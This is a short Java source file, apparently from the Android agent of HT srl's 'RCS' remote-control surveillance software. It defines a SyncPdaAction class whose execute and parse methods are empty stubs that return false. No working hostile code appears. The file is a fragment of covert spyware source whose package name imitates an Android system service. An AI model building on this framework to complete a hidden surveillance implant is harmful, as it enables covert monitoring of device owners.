/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SyncPdaAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

// TODO: Auto-generated Javadoc
/**
 * The Class SyncPdaAction.
 */
public class SyncPdaAction extends SubAction {

	/**
	 * Instantiates a new sync pda action.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public SyncPdaAction(final SubActionType type, final byte[] confParams) {
		super(type, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute() {
		// TODO Auto-generated method stub
		return false;
	}

	@Override
	protected boolean parse(byte[] params) {
		// TODO Auto-generated method stub
		return false;
	}

}
